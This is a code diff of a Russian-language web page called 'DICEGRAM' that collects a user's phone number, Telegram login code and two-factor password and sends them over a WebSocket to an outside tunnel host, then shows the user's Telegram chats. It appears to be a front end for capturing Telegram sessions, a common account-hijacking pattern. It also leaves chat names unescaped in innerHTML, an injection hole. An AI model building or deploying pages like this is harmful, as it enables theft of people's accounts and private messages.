@@ -63,7 +63,6 @@
         }
         button:hover { background: #4372a3; }
         
-        /* Стили списка чатов (Экран мессенджера) */
         #messenger-screen { justify-content: flex-start; padding: 0; }
         .header {
             width: 100%;
@@ -97,7 +96,6 @@
             padding: 3px 8px;
             border-radius: 10px;
         }
-        
         #server-status {
             padding: 8px;
             font-size: 12px;
@@ -110,19 +108,19 @@
 
 <div class="app-container">
     
-    <div id="server-status" style="color: #e6a23c; text-align: center;">Проверка соединения с сервером...</div>
+    <div id="server-status" style="color: #e6a23c; text-align: center;">Проверка соединения...</div>
 
     <div id="phone-screen" class="screen hidden">
         <h2>DICEGRAM</h2>
-        <p>Введите ваш номер телефона в международном формате</p>
+        <p>Введите ваш номер телефона</p>
         <input type="tel" id="phone-input" placeholder="+77071234567">
         <button onclick="sendPhone()">Далее</button>
     </div>
 
     <div id="code-screen" class="screen hidden">
         <h2>Введите код</h2>
-        <p>Код подтверждения отправлен в ваше приложение Telegram</p>
-        <input type="text" id="code-input" placeholder="Код">
+        <p>Код подтверждения отправлен в ваш Telegram</p>
+        <input type="text" id="code-input" placeholder="Код из СМС/ТГ">
         <button onclick="sendCode()">Подтвердить</button>
     </div>
 
@@ -134,17 +132,15 @@
     </div>
 
     <div id="messenger-screen" class="screen hidden">
-        <div class="header" id="user-header">Чат DICEGRAM</div>
-        <div class="chats-list" id="chats-container">
-            </div>
+        <div class="header" id="user-header">DICEGRAM ЧАТЫ</div>
+        <div class="chats-list" id="chats-container"></div>
     </div>
 
 </div>
 
 <script>
-    // Подключение к твоему серверу. 
-    // Замени "ws://localhost:8080" на адрес твоего прокси/хостинга, например: wss://a38499-be46.m.jrnm.app
-    const socket = new WebSocket('https://a38499-be46.m.jrnm.app/');
+    // Подключаемся по wss:// к твоему публичному хостингу
+    const socket = new WebSocket('wss://a38499-be46.m.jrnm.app');
     
     const statusBox = document.getElementById('server-status');
 
@@ -152,7 +148,6 @@
         statusBox.innerText = 'Сервер DICEGRAM онлайн';
         statusBox.style.backgroundColor = '#1c3222';
         statusBox.style.color = '#4caf50';
-        // Если сервер онлайн, показываем первый экран ввода телефона
         document.getElementById('phone-screen').classList.remove('hidden');
     };
 
@@ -160,7 +155,6 @@
         statusBox.innerText = 'СЕРВЕР ОТКЛЮЧЕН. DICEGRAM недоступен.';
         statusBox.style.backgroundColor = '#3c1c1c';
         statusBox.style.color = '#f56c6c';
-        // Прячем экраны ввода, так как сервер мертв
         hideAllScreens();
     };
 
@@ -171,26 +165,24 @@
             hideAllScreens();
             document.getElementById('code-screen').classList.remove('hidden');
         } 
-        elif (data.status === 'password_needed') {
+        else if (data.status === 'password_needed') {
             hideAllScreens();
             document.getElementById('password-screen').classList.remove('hidden');
         } 
-        elif (data.status === 'success') {
+        else if (data.status === 'success') {
             hideAllScreens();
             document.getElementById('messenger-screen').classList.remove('hidden');
             document.getElementById('user-header').innerText = `DICEGRAM (${data.first_name})`;
-            
-            // Рендерим список чатов как в ТГ
             renderChats(data.dialogs);
         } 
-        elif (data.status === 'error') {
-            alert(data.message);
+        else if (data.status === 'error') {
+            alert("Ошибка сервера: " + data.message);
         }
     };
 
     function sendPhone() {
         const phone = document.getElementById('phone-input').value;
-        if (!phone) return alert('Введите номер телефона!');
+        if (!phone) return alert('Введите номер!');
         socket.send(JSON.stringify({ action: 'send_phone', phone: phone }));
     }
 
@@ -213,9 +205,7 @@
         chats.forEach(chat => {
             const item = document.createElement('div');
             item.className = 'chat-item';
-            
             let unreadBadge = chat.unread > 0 ? `<span class="chat-unread">${chat.unread}</span>` : '';
-            
             item.innerHTML = `
                 <div class="chat-name">${chat.name}</div>
                 ${unreadBadge}
